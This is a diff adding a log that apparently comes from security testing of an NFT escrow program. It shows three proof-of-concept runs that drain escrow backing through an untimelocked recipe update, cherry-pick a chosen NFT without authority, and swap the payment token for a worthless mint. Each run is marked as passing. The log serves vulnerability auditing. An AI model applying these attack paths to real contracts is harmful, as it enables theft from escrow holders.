@@ -1,0 +1,25 @@
+### 10_escrow_drain
+bigint: Failed to load bindings, pure JS will be used (try npm run rebuild?)
+escrow backing before: 3000000 (=3R)
+update_recipe_v1(amount=0) succeeded instantly (no timelock)
+NFTs captured out at amount=0; escrow backing unchanged: 3000000
+update_recipe_v1(amount=3R) succeeded instantly (raise before release)
+escrow backing after malicious release: 0
+attacker token balance: 3000000
+
+RESULT: authority pulled 2 NFTs for 0 backing, then drained 3000000 backing tokens (of 3000000). No timelock, single signer.
+POC 10 EXECUTED: PASS (escrow drained via untimelocked update_recipe_v1)
+exit=0
+### 11_cherrypick
+bigint: Failed to load bindings, pure JS will be used (try npm run rebuild?)
+rare asset 7hcGKymnpvmbpE9Yn2M2UfWWkz3hKj2mbEfhpU4fUJ2x owner before = BpH61wF4YKFawu9fXaUwuPNAK8ADtVF4e52bZrMB7rRY (escrow)
+rare owner after  = 26LYqtMZdoFaX1AHSYPPx7hVzh655z5iA6ySgHQJj5pu (bot = 26LYqtMZdoFaX1AHSYPPx7hVzh655z5iA6ySgHQJj5pu)
+POC 11 EXECUTED: PASS (permissionless cherry-pick of a chosen NFT by a non-authority bot)
+exit=0
+### 12_token_swap
+bigint: Failed to load bindings, pure JS will be used (try npm run rebuild?)
+recipe.token before = 9wpEWVNBQCwak8WuTCoccNB9GzuQoRxEhjCgk8fzHs3a (real)
+recipe.token after empty update = 64mhRHKNuAoQyAAJ46DU9FNrdjLcjpHjKZ4YrmiN1Rtf (junk = 64mhRHKNuAoQyAAJ46DU9FNrdjLcjpHjKZ4YrmiN1Rtf)
+NFT owner after capture paid in junk = EnuFeQE2snuGpmqVNyy9SGnd3VTQRYWwx12MjwLyshJL ; recipe.token restored = 9wpEWVNBQCwak8WuTCoccNB9GzuQoRxEhjCgk8fzHs3a
+POC 12 EXECUTED: PASS (recipe.token overwritten by an update with no token field; NFT captured with worthless mint)
+exit=0
